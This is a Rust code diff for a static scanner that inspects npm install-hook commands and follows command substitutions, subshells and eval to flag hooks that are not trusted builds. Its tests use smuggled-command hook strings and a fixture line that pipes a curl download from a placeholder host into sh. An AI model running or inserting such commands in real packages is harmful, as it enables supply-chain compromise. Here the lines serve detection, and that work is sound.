@@ -4,8 +4,8 @@
 //!
 //! The hook string is split into commands. A directly referenced local file is
 //! read, up to one `npm run` hop and up to [`MAX_INLINE_SHELL_DEPTH`] nested
-//! `sh -c` commands. Nothing is executed, and a bare `require()` module name is
-//! not resolved.
+//! `sh -c` commands or command substitutions. Nothing is executed, and a bare
+//! `require()` module name is not resolved.
 
 use super::{
     HookDisposition, MAX_HOOK_CHARS, MAX_MANIFEST_BYTES, MAX_REFERENCED_SCRIPTS, structural_escape,
@@ -31,7 +31,7 @@ const TRUSTED_COMMANDS: &[&str] = &[
     "prebuildify",
 ];
 
-/// Nested `sh -c` / `bash -c` expansions followed from one hook body.
+/// Nested `sh -c` and command-substitution expansions followed from one hook body.
 ///
 /// The fourth expansion is [`HookDisposition::Unverified`]. Three expansions are
 /// the deepest command line this parser can spell without backslash escapes.
@@ -318,9 +318,63 @@ impl<'a> ArgCursor<'a> {
 }
 
 fn walk_script(raw: &str, depth: u8, walk: &mut Walk<'_>) {
-    for argv in split_commands(raw) {
+    for segment in split_segments(raw) {
         *walk.segments += 1;
-        if argv.is_empty() {
+        if segment.argv.is_empty() {
+            continue;
+        }
+        let expansion = expansions(&segment.raw);
+        let walked_substitution = !expansion.substitutions.is_empty();
+        if let Some(reason) = expansion.opaque {
+            *walk.saw_unverified = true;
+            *walk.saw_other = true;
+            walk.warnings
+                .push(format!("skipped `{}`: {reason}", segment.raw.trim()));
+        }
+        for body in expansion.substitutions {
+            if depth >= MAX_INLINE_SHELL_DEPTH {
+                *walk.saw_unverified = true;
+                walk.warnings.push(format!(
+                    "skipped nested command substitution: inline shell analysis stops after {MAX_INLINE_SHELL_DEPTH} levels"
+                ));
+                continue;
+            }
+            walk_script(&body, depth + 1, walk);
+        }
+        if expansion.disqualify {
+            *walk.saw_unverified = true;
+            *walk.saw_other = true;
+            walk.warnings.push(format!(
+                "skipped `{}`: shell syntax is not a trusted build",
+                segment.raw.trim()
+            ));
+        }
+        if expansion.opaque.is_some() || expansion.disqualify {
+            continue;
+        }
+        let argv = segment.argv.as_slice();
+        if shell_executes_text(&argv[0]) {
+            *walk.saw_unverified = true;
+            *walk.saw_other = true;
+            walk.warnings.push(format!(
+                "command `{}` executes shell text and is not a trusted build",
+                argv[0]
+            ));
+            let name = program_name(&argv[0]);
+            if name == "eval" {
+                let tail = argv[1..].join(" ");
+                if !tail.is_empty() && !walked_substitution {
+                    if depth >= MAX_INLINE_SHELL_DEPTH {
+                        walk.warnings.push(format!(
+                            "skipped nested command substitution: inline shell analysis stops after {MAX_INLINE_SHELL_DEPTH} levels"
+                        ));
+                    } else {
+                        walk_script(&tail, depth + 1, walk);
+                    }
+                }
+            } else if let Some(path) = argv.iter().skip(1).find(|arg| !arg.starts_with('-')) {
+                read_referenced(walk, path);
+            }
             continue;
         }
         if trusted_command(&argv[0], walk.shadowed) {
@@ -336,20 +390,20 @@ fn walk_script(raw: &str, depth: u8, walk: &mut Walk<'_>) {
             continue;
         }
         if depth == 0
-            && let Some(name) = npm_run_target(&argv)
+            && let Some(name) = npm_run_target(argv)
         {
             follow_package_script(walk, &name);
             continue;
         }
         if let Some(kind) = interpreter(&argv[0]) {
             let invocation = match kind {
-                Interpreter::Shell => parse_shell(&argv),
-                Interpreter::Node => parse_profile(&argv, node_profile()),
-                Interpreter::Bun => parse_profile(&argv, bun_profile()),
-                Interpreter::Deno => parse_profile(&argv, deno_profile()),
-                Interpreter::Tsx => parse_profile(&argv, tsx_profile()),
-                Interpreter::TsNode => parse_profile(&argv, ts_node_profile()),
-                Interpreter::Python => parse_profile(&argv, python_profile()),
+                Interpreter::Shell => parse_shell(argv),
+                Interpreter::Node => parse_profile(argv, node_profile()),
+                Interpreter::Bun => parse_profile(argv, bun_profile()),
+                Interpreter::Deno => parse_profile(argv, deno_profile()),
+                Interpreter::Tsx => parse_profile(argv, tsx_profile()),
+                Interpreter::TsNode => parse_profile(argv, ts_node_profile()),
+                Interpreter::Python => parse_profile(argv, python_profile()),
             };
             apply_invocation(&argv[0], invocation, depth, walk);
             continue;
@@ -787,10 +841,228 @@ fn cap_script(raw: &str) -> String {
     kept
 }
 
+struct CommandSegment {
+    argv: Vec<String>,
+    /// Original text of one command, including quotes. Separators are excluded.
+    raw: String,
+}
+
+struct Expansion {
+    /// Bodies of `$(...)`, backticks, process substitution, and subshells.
+    substitutions: Vec<String>,
+    /// Syntax this parser will not claim to understand.
+    opaque: Option<&'static str>,
+    /// The segment runs shell syntax even when the inner commands are trusted.
+    disqualify: bool,
+}
+
+#[cfg(test)]
 fn split_commands(raw: &str) -> Vec<Vec<String>> {
+    split_segments(raw)
+        .into_iter()
+        .map(|segment| segment.argv)
+        .collect()
+}
+
+fn shell_executes_text(argv0: &str) -> bool {
+    if !is_bare_command(argv0) {
+        return false;
+    }
+    matches!(program_name(argv0).as_str(), "eval" | "source" | ".")
+}
+
+fn is_simple_name(body: &str) -> bool {
+    let mut chars = body.chars();
+    match chars.next() {
+        Some(ch) if ch == '_' || ch.is_ascii_alphabetic() => {}
+        _ => return false,
+    }
+    chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+}
+
+/// Quote-aware scan of one command. Single quotes hide their contents.
+/// Double quotes still expand `$` and backticks. `$(...)` and backticks are
+/// returned so the caller can walk them. Other shell syntax is either a
+/// plain redirection or a reason to stop trusting the segment.
+fn expansions(raw: &str) -> Expansion {
+    let mut substitutions = Vec::new();
+    let mut opaque = None;
+    let mut disqualify = false;
+    let mut chars = raw.chars().peekable();
+    let mut quote: Option<char> = None;
+    let note = |opaque: &mut Option<&'static str>, reason: &'static str| {
+        if opaque.is_none() {
+            *opaque = Some(reason);
+        }
+    };
+    while let Some(ch) = chars.next() {
+        if let Some(mark) = quote {
+            if ch == mark {
+                quote = None;
+                continue;
+            }
+            if mark == '\'' {
+                continue;
+            }
+        } else if ch == '\'' || ch == '"' {
+            quote = Some(ch);
+            continue;
+        }
+        if ch == '$' {
+            match chars.peek().copied() {
+                Some('(') => {
+                    chars.next();
+                    match take_group(&mut chars, '(', ')') {
+                        Ok(body) => substitutions.push(body),
+                        Err(()) => note(&mut opaque, "command substitution is not balanced"),
+                    }
+                }
+                Some('{') => {
+                    chars.next();
+                    match take_group(&mut chars, '{', '}') {
+                        Ok(body) if is_simple_name(&body) => {}
+                        Ok(_) => note(&mut opaque, "parameter expansion is not a plain name"),
+                        Err(()) => note(&mut opaque, "parameter expansion is not balanced"),
+                    }
+                }
+                Some(name) if name == '_' || name.is_ascii_alphabetic() => {
+                    chars.next();
+                    while chars
+                        .peek()
+                        .is_some_and(|next| *next == '_' || next.is_ascii_alphanumeric())
+                    {
+                        chars.next();
+                    }
+                }
+                _ => note(&mut opaque, "parameter expansion is not a plain name"),
+            }
+            continue;
+        }
+        if ch == '`' {
+            let mut body = String::new();
+            let mut closed = false;
+            for inner in chars.by_ref() {
+                if inner == '`' {
+                    closed = true;
+                    break;
+                }
+                body.push(inner);
+            }
+            if closed {
+                substitutions.push(body);
+            } else {
+                note(&mut opaque, "command substitution is not balanced");
+            }
+            continue;
+        }
+        if quote.is_some() {
+            continue;
+        }
+        if ch == '<' || ch == '>' {
+            if chars.peek() == Some(&'(') {
+                chars.next();
+                match take_group(&mut chars, '(', ')') {
+                    Ok(body) => substitutions.push(body),
+                    Err(()) => note(&mut opaque, "process substitution is not balanced"),
+                }
+                disqualify = true;
+                continue;
+            }
+            if ch == '<' && chars.peek() == Some(&'<') {
+                chars.next();
+                if chars.peek() == Some(&'-') {
+                    chars.next();
+                }
+                note(&mut opaque, "here-document is not expanded");
+                continue;
+            }
+            if ch == '<' {
+                note(&mut opaque, "input redirection is not a trusted build");
+                continue;
+            }
+            if chars.peek() == Some(&'&') {
+                chars.next();
+                let mut digits = 0;
+                while chars.peek().is_some_and(|next| next.is_ascii_digit()) {
+                    chars.next();
+                    digits += 1;
+                }
+                if digits == 0 {
+                    note(&mut opaque, "redirection is not a plain fd duplicate");
+                }
+                continue;
+            }
+            if chars.peek() == Some(&'>') {
+                chars.next();
+            }
+            continue;
+        }
+        if ch == '(' {
+            match take_group(&mut chars, '(', ')') {
+                Ok(body) => substitutions.push(body),
+                Err(()) => note(&mut opaque, "subshell is not balanced"),
+            }
+            disqualify = true;
+            continue;
+        }
+        if ch == '{' {
+            note(&mut opaque, "brace group is not expanded");
+        }
+    }
+    if quote.is_some() {
+        note(&mut opaque, "quote is not closed");
+    }
+    Expansion {
+        substitutions,
+        opaque,
+        disqualify,
+    }
+}
+
+fn take_group(
+    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
+    open: char,
+    close: char,
+) -> Result<String, ()> {
+    let mut depth = 1;
+    let mut out = String::new();
+    let mut quote = None;
+    for ch in chars.by_ref() {
+        if let Some(mark) = quote {
+            out.push(ch);
+            if ch == mark {
+                quote = None;
+            }
+            continue;
+        }
+        if ch == '\'' || ch == '"' {
+            quote = Some(ch);
+            out.push(ch);
+            continue;
+        }
+        if ch == open {
+            depth += 1;
+            out.push(ch);
+            continue;
+        }
+        if ch == close {
+            depth -= 1;
+            if depth == 0 {
+                return Ok(out);
+            }
+            out.push(ch);
+            continue;
+        }
+        out.push(ch);
+    }
+    Err(())
+}
+
+fn split_segments(raw: &str) -> Vec<CommandSegment> {
     let mut commands = Vec::new();
     let mut current = Vec::new();
     let mut word = String::new();
+    let mut segment = String::new();
     let mut chars = raw.chars().peekable();
     let mut quote: Option<char> = None;
     let flush_word = |word: &mut String, current: &mut Vec<String>| {
@@ -798,13 +1070,23 @@ fn split_commands(raw: &str) -> Vec<Vec<String>> {
             current.push(std::mem::take(word));
         }
     };
-    let flush_command = |current: &mut Vec<String>, commands: &mut Vec<Vec<String>>| {
+    let flush_command = |word: &mut String,
+                         current: &mut Vec<String>,
+                         segment: &mut String,
+                         commands: &mut Vec<CommandSegment>| {
+        flush_word(word, current);
         if !current.is_empty() {
-            commands.push(std::mem::take(current));
+            commands.push(CommandSegment {
+                argv: std::mem::take(current),
+                raw: std::mem::take(segment),
+            });
+        } else {
+            segment.clear();
         }
     };
     while let Some(ch) = chars.next() {
         if let Some(mark) = quote {
+            segment.push(ch);
             if ch == mark {
                 quote = None;
             } else {
@@ -813,29 +1095,48 @@ fn split_commands(raw: &str) -> Vec<Vec<String>> {
             continue;
         }
         match ch {
-            '\'' | '"' => quote = Some(ch),
-            ' ' | '\t' | '\r' => flush_word(&mut word, &mut current),
-            '\n' | ';' => {
+            '\'' | '"' => {
+                quote = Some(ch);
+                segment.push(ch);
+            }
+            ' ' | '\t' | '\r' => {
+                segment.push(ch);
                 flush_word(&mut word, &mut current);
-                flush_command(&mut current, &mut commands);
+            }
+            '\n' | ';' => {
+                flush_command(&mut word, &mut current, &mut segment, &mut commands);
             }
             '&' | '|' => {
-                let repeated = chars.peek() == Some(&ch);
                 if ch == '&' && chars.peek() == Some(&'>') {
+                    segment.push(ch);
                     word.push(ch);
                     continue;
                 }
+                if ch == '&' && word.ends_with('>') {
+                    segment.push(ch);
+                    word.push(ch);
+                    while chars.peek().is_some_and(|next| next.is_ascii_digit()) {
+                        let Some(digit) = chars.next() else {
+                            break;
+                        };
+                        segment.push(digit);
+                        word.push(digit);
+                    }
+                    continue;
+                }
+                let repeated = chars.peek() == Some(&ch);
                 if repeated {
                     chars.next();
                 }
-                flush_word(&mut word, &mut current);
-                flush_command(&mut current, &mut commands);
+                flush_command(&mut word, &mut current, &mut segment, &mut commands);
             }
-            _ => word.push(ch),
+            _ => {
+                segment.push(ch);
+                word.push(ch);
+            }
         }
     }
-    flush_word(&mut word, &mut current);
-    flush_command(&mut current, &mut commands);
+    flush_command(&mut word, &mut current, &mut segment, &mut commands);
     commands
 }
 
@@ -1384,5 +1685,125 @@ mod tests {
             split_commands("one\ntwo"),
             vec![vec!["one".to_owned()], vec!["two".to_owned()]]
         );
+        assert_eq!(
+            split_commands("node-gyp rebuild 2>&1"),
+            vec![vec![
+                "node-gyp".to_owned(),
+                "rebuild".to_owned(),
+                "2>&1".to_owned(),
+            ]]
+        );
+    }
+
+    #[test]
+    fn substitution_in_a_trusted_command_is_read() {
+        let root = temp_package("subst");
+        write_payload(&root, "install.js");
+        for body in [
+            "husky $(node install.js)",
+            "husky `node install.js`",
+            "node-gyp rebuild --x=\"$(sh install.js)\"",
+            "husky <(node install.js)",
+            "husky >(node install.js)",
+        ] {
+            let (disposition, extra, warnings) = resolve_at(&root, body);
+            assert_ne!(
+                disposition,
+                HookDisposition::TrustedBuild,
+                "{body}: {warnings:?}"
+            );
+            assert!(
+                extra.contains("curl https://example.invalid/x.sh | sh"),
+                "{body} did not read install.js: {extra}"
+            );
+        }
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn single_quoted_substitution_stays_a_literal() {
+        let root = temp_package("subst-literal");
+        let (disposition, extra, warnings) = resolve_at(&root, "husky '$(echo ok)'");
+        assert_eq!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
+        assert!(extra.is_empty(), "{extra}");
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn trusted_command_redirection_stays_trusted() {
+        let root = temp_package("redir");
+        let (disposition, extra, warnings) = resolve_at(&root, "node-gyp rebuild 2>&1");
+        assert_eq!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
+        assert!(extra.is_empty(), "{extra}");
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn nested_substitution_follows_until_depth_limit() {
+        let root = temp_package("subst-depth");
+        write_payload(&root, "install.js");
+        let at_limit = "husky $(husky $(husky $(node install.js)))";
+        let (disposition, extra, warnings) = resolve_at(&root, at_limit);
+        assert_ne!(disposition, HookDisposition::TrustedBuild, "{warnings:?}");
+        assert!(
+            extra.contains("curl https://example.invalid/x.sh | sh"),
+            "nested substitution did not read install.js: {extra}"
+        );
+
+        let past_limit = "husky $(husky $(husky $(husky $(node install.js))))";
+        let (disposition, extra, warnings) = resolve_at(&root, past_limit);
+        assert_eq!(disposition, HookDisposition::Unverified, "{warnings:?}");
+        assert!(
+            !extra.contains("curl https://example.invalid/x.sh | sh"),
+            "substitution past the depth limit was still read: {extra}"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn plain_variables_and_output_redirection_stay_trusted() {
+        let root = temp_package("plain-shell");
+        for body in [
+            "husky install $PREFIX",
+            "husky install ${PREFIX}",
+            "node-gyp rebuild >/dev/null",
+            "node-gyp rebuild > /dev/null",
+            "node-gyp rebuild >> build.log",
+            "node-gyp rebuild &> /dev/null",
+        ] {
+            let (disposition, extra, warnings) = resolve_at(&root, body);
+            assert_eq!(
+                disposition,
+                HookDisposition::TrustedBuild,
+                "{body}: {warnings:?}"
+            );
+            assert!(extra.is_empty(), "{body}: {extra}");
+        }
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn unevaluated_shell_syntax_is_not_trusted() {
+        let root = temp_package("opaque-shell");
+        write_payload(&root, "install.js");
+        for body in [
+            "husky install ${PREFIX:-x}",
+            "husky install $?",
+            "husky (node install.js)",
+            "husky { node install.js; }",
+            "husky <<EOF",
+            "eval node install.js",
+            ". install.js",
+            "source install.js",
+            "husky $(node install.js",
+        ] {
+            let (disposition, _, warnings) = resolve_at(&root, body);
+            assert_ne!(
+                disposition,
+                HookDisposition::TrustedBuild,
+                "{body}: {warnings:?}"
+            );
+        }
+        let _ = fs::remove_dir_all(&root);
     }
 }
